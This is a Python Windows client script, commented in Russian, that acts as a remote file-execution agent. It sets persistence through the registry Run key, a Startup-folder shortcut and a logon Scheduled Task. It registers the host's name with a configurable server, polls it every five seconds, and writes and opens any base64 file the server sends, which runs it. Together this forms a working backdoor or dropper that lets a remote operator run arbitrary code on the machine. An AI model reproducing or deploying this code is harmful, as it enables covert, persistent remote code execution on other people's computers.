import requests
import uuid
import socket
import time
import os
import platform
import subprocess
import base64
import winreg
import win32com.client
import pythoncom
import ctypes
import sys
import logging

# Настройка логирования
if getattr(sys, 'frozen', False):
    log_dir = os.path.dirname(sys.executable)
else:
    log_dir = os.path.dirname(__file__)
logging.basicConfig(
    filename=os.path.join(log_dir, 'client.log'),
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

# URL сервера
SERVER_URL = "your_playit_url"
if getattr(sys, 'frozen', False):
    DOWNLOAD_DIR = os.path.join(os.path.dirname(sys.executable), "tempfiles")
else:
    DOWNLOAD_DIR = os.path.join(os.path.dirname(__file__), "tempfiles")
APP_NAME = "FileClient"

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except Exception as e:
        logging.error(f"Failed to check admin privileges: {e}")
        return False

def add_to_startup():
    try:
        if getattr(sys, 'frozen', False):
            app_path = sys.executable
        else:
            app_path = f'"{os.path.join(os.path.dirname(sys.executable), "pythonw.exe")}" "{os.path.abspath(__file__)}"'

        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, APP_NAME, 0, winreg.REG_SZ, app_path)
            winreg.CloseKey(key)
            print("Added to registry startup")
            logging.info("Added to registry startup")
        except Exception as e:
            print(f"Error adding to registry: {e}")
            logging.error(f"Error adding to registry: {e}")

        try:
            startup_folder = os.path.join(os.getenv('APPDATA'), r"Microsoft\Windows\Start Menu\Programs\Startup")
            shortcut_path = os.path.join(startup_folder, f"{APP_NAME}.lnk")
            if not os.path.exists(shortcut_path):
                shell = win32com.client.Dispatch('WScript.Shell')
                shortcut = shell.CreateShortCut(shortcut_path)
                if getattr(sys, 'frozen', False):
                    shortcut.TargetPath = sys.executable
                else:
                    shortcut.TargetPath = os.path.join(os.path.dirname(sys.executable), "pythonw.exe")
                    shortcut.Arguments = f'"{os.path.abspath(__file__)}"'
                shortcut.WorkingDirectory = os.path.dirname(sys.executable if getattr(sys, 'frozen', False) else __file__)
                shortcut.Save()
                print("Added to startup folder")
                logging.info("Added to startup folder")
        except Exception as e:
            print(f"Error adding to startup folder: {e}")
            logging.error(f"Error adding to startup folder: {e}")

        if is_admin():
            try:
                pythoncom.CoInitializeEx(pythoncom.COINIT_MULTITHREADED)
                scheduler = win32com.client.Dispatch("Schedule.Service")
                scheduler.Connect()

                root_folder = scheduler.GetFolder("\\")
                task_def = scheduler.NewTask(0)

                trigger = task_def.Triggers.Create(9)
                trigger.Id = "LogonTrigger"
                trigger.UserId = os.getlogin()

                action = task_def.Actions.Create(1)
                if getattr(sys, 'frozen', False):
                    action.Path = sys.executable
                else:
                    action.Path = os.path.join(os.path.dirname(sys.executable), "pythonw.exe")
                    action.Arguments = f'"{os.path.abspath(__file__)}"'
                action.WorkingDirectory = os.path.dirname(sys.executable if getattr(sys, 'frozen', False) else __file__)

                task_def.Settings.Enabled = True
                task_def.Settings.StartWhenAvailable = True
                task_def.Settings.Hidden = False

                root_folder.RegisterTaskDefinition(
                    APP_NAME,
                    task_def,
                    6,
                    None, None,
                    3
                )
                print("Added to Task Scheduler")
                logging.info("Added to Task Scheduler")
            except Exception as e:
                print(f"Error adding to Task Scheduler: {e}")
                logging.error(f"Error adding to Task Scheduler: {e}")
            finally:
                pythoncom.CoUninitialize()
        else:
            print("Skipping Task Scheduler: Administrator privileges required")
            logging.warning("Skipping Task Scheduler: Administrator privileges required")

    except Exception as e:
        print(f"Error in add_to_startup: {e}")
        logging.error(f"Error in add_to_startup: {e}")

def validate_url(url):
    if not url.startswith(('http://', 'https://')):
        print(f"Adding default scheme http:// to URL: {url}")
        logging.info(f"Adding default scheme http:// to URL: {url}")
        return f"http://{url}"
    return url

def check_server_availability():
    try:
        validated_url = validate_url(SERVER_URL)
        response = requests.head(validated_url, timeout=5)
        if response.status_code in [200, 405]:
            print("Server is available")
            logging.info("Server is available")
            return True
        else:
            print(f"Server returned status code: {response.status_code}")
            logging.error(f"Server returned status code: {response.status_code}")
            return False
    except Exception as e:
        print(f"Failed to connect to server: {e}")
        logging.error(f"Failed to connect to server: {e}")
        return False

def register_client(client_id, client_name):
    try:
        validated_url = validate_url(f"{SERVER_URL}/api/register")
        response = requests.post(
            validated_url,
            json={"client_id": client_id, "client_name": client_name},
            timeout=10
        )
        if response.status_code == 200:
            print("Client registered successfully")
            logging.info("Client registered successfully")
            return True
        else:
            print(f"Registration failed with status code: {response.status_code}, response: {response.text}")
            logging.error(f"Registration failed with status code: {response.status_code}, response: {response.text}")
            return False
    except Exception as e:
        print(f"Error registering client: {e}")
        logging.error(f"Error registering client: {e}")
        return False

def check_for_file(client_id):
    try:
        validated_url = validate_url(f"{SERVER_URL}/api/check/{client_id}")
        response = requests.get(validated_url, timeout=10)
        if response.status_code == 200:
            data = response.json()
            return data.get("file")
        else:
            print(f"Check file failed with status code: {response.status_code}")
            logging.error(f"Check file failed with status code: {response.status_code}")
    except Exception as e:
        print(f"Error checking for file: {e}")
        logging.error(f"Error checking for file: {e}")
    return None

def download_and_open_file(file_data, retries=3, delay=5):
    for attempt in range(retries):
        try:
            if not os.path.exists(DOWNLOAD_DIR):
                os.makedirs(DOWNLOAD_DIR)

            filename = file_data["filename"]
            file_content = base64.b64decode(file_data["content"])
            file_path = os.path.join(DOWNLOAD_DIR, filename)

            with open(file_path, 'wb') as f:
                f.write(file_content)

            if platform.system() == "Windows":
                os.startfile(file_path)
            else:
                subprocess.run(["xdg-open", file_path] if platform.system() == "Linux" else ["open", file_path])
            print(f"Successfully downloaded and opened file: {filename}")
            logging.info(f"Successfully downloaded and opened file: {filename}")
            return

        except base64.binascii.Error as e:
            print(f"Attempt {attempt + 1} failed: Invalid base64 data - {e}")
            logging.error(f"Attempt {attempt + 1} failed: Invalid base64 data - {e}")
        except Exception as e:
            print(f"Attempt {attempt + 1} failed: {e}")
            logging.error(f"Attempt {attempt + 1} failed: {e}")
        if attempt < retries - 1:
            print(f"Retrying in {delay} seconds...")
            logging.info(f"Retrying in {delay} seconds...")
            time.sleep(delay)
    print(f"Failed to process file after {retries} attempts")
    logging.error(f"Failed to process file after {retries} attempts")

def main():
    try:
        client_id = str(uuid.uuid4())
        client_name = socket.gethostname()
        print(f"Client ID: {client_id}, Name: {client_name}")
        logging.info(f"Client ID: {client_id}, Name: {client_name}")

        if not check_server_availability():
            print("Cannot proceed due to server unavailability")
            logging.error("Cannot proceed due to server unavailability")
            return

        if platform.system() == "Windows":
            add_to_startup()

        if not register_client(client_id, client_name):
            print("Failed to register client")
            logging.error("Failed to register client")
            return

        print("Client registered, waiting for files...")
        logging.info("Client registered, waiting for files...")
        while True:
            file_data = check_for_file(client_id)
            if file_data and "filename" in file_data and "content" in file_data:
                print(f"Received file to download: {file_data['filename']}")
                logging.info(f"Received file to download: {file_data['filename']}")
                download_and_open_file(file_data)
            time.sleep(5)

    except Exception as e:
        print(f"Main execution failed: {e}")
        logging.error(f"Main execution failed: {e}")

if __name__ == "__main__":
    main()
